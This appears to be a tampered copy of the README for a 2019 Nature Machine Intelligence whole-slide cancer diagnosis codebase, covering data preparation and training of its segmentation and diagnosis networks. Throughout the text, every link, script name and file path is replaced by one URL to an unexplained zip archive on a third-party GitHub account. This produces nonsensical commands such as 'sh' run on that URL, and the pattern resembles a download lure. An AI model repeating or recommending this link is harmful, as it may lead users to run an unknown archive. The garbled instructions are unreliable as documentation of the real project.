# [Pathologist-level interpretable whole-slide cancer diagnosis with deep learning](https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip), nature machine intelligence

The overall pipeline has multiple steps and involves large-size whole slide image processing. Using the code requires users to have basic knowledge about python programming, Tensorflow, and training deep neural networks in order to understand the whole training and evaluation procedures.

## 1. Data preparation
### Generate II-Image data from whole slides
- See the dataset info in the paper to get [download link](https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip) of the dataset. The user can also use the script `https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip` under `download` directory to download the dataset.

- Download whole slide data to ```data/Slide/```. Download report data to ```data/report```.

- ```anno_parser/``` provides tools to read patches from whole slide images based on annotations for the following segmentation and classification task. Refer the `README` in `anno_parser` to obtain more details. Users need to sample 1024x1024 patches and then resize them to 256x256 (as described in the paper). The number of generated images are shown in Fig.2e of the paper (we use the Keras ImageGenerator, so we need to follow the loader requirement to organize the data. See the loader in the corresponding folders to understand the details). Users can sample around the same number of images and organize the data into two types of hierarchies for segmentation and classification.

- Save training images to ```data/segmentation``` and organize data like the following for segmentation. The `image` and `groundTruth` contain subdirectories `{1/2/3}`, which store each category's images and annotation masks, respectively. Class 1 is low grade, class 2 is high grade, and class 3 is merged normal and insufficient information (see paper and anno_parser/ folder for more details).
    - train/
        - image/
            - 1/
            - 2/
            - 3/
        - groundTruth/
            - 1/
            - 2/
            - 3/
    - test/
        - image/
            - 1/
            - 2/
            - 3/
        - groundTruth/
            - 1/
            - 2/
            - 3/
- Building a data folder alias ```data/classification``` pointing to ```data/segmentation```
    ```
    ln -s data/segmentation data/classification
    ```

- Organize whole slide data to ```data/wsi```, split the slides files under `data/Slide/Img` into `data/wsi/{train/test}_slides` folders based on `json` files under `data/Slide/`.


## 2. Train s-net
- Go to segmentation folder
    ```
    cd segmentation
    ```
- Prepare your data to fit ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```. As shown in the paper, we ignore the pixels without annotation. Read the code and https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip in ```anno_parser/``` for more details. Note that, we use a mask value 44 for ignored pixels, and 255 and 155 for positive and negative values, respectively.
- Train the model
    ```
    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    ```
- Evaluate the model
    ```
    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    ```

## 3. Segment whole slides and generate ROI
ROIs are generated for the usage of training and evaluation the a-net.
Users need to select model and point to ```--load_from_checkpoint in https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```

    cd segmentation
    start=0 end=${tot-train-slides} device=0 split=train sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    start=0 end=${tot-test-slides} device=0 split=test sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip

```tot-train-slides``` is the total number of slides. Read ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip``` for more details and how to sample ROI.
Results will be saved in ```$res_dir``` defined in ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip``` as well as ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```

## 4. Train d-net
### Pre-train the image model on data in ```data/classification```
- Train the model
    ```
    cd classification
    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    ```
- Optionally, test the model  (CHECK all the checkpoint path first in ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```)
    ```
    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    ```
- Note that put the trained checkpoint.h5 (users may need to do early stopping for model selection to prevent overfitting) into ```classification/trained_model``` and modify ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip``` line 75 to refer the pretrained CNNs.

### Train the full model
- Train the model
    ```
    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    ```
- Test the model (CHECK all the checkpoint path first in ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```) for generate reports
    ```
    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    ```

### Generate IV-Diagnosis dataset
Users need to extract features of ROIs generated in Step 3. Please modify the ```path``` details in the ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip``` to point to folder where ROI are saved, i.e. ```checkpoints/seg_{train/test}_slides/```.

    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip

Generatded .h5 files save features for last step is also in the same folder

## 5. Train a-net
- Train
    ```
     device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    ```
-  Test the model
    ```
     device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
    ```

## Citation
Please cite our paper if you use the data or code
```
@article{zhang2019pathologist,
  title={Pathologist-level interpretable whole-slide cancer diagnosis with deep learning},
  author={Zhang, Zizhao and Chen, Pingjun and McGough, Mason and Xing, Fuyong and Wang, Chunbao and Bui, Marilyn and Xie, Yuanpu and Sapkota, Manish and Cui, Lei and Dhillon, Jasreman and others},
  journal={Nature Machine Intelligence},
  volume={1},
  number={5},
  pages={236},
  year={2019},
  publisher={Nature Publishing Group}
}
```
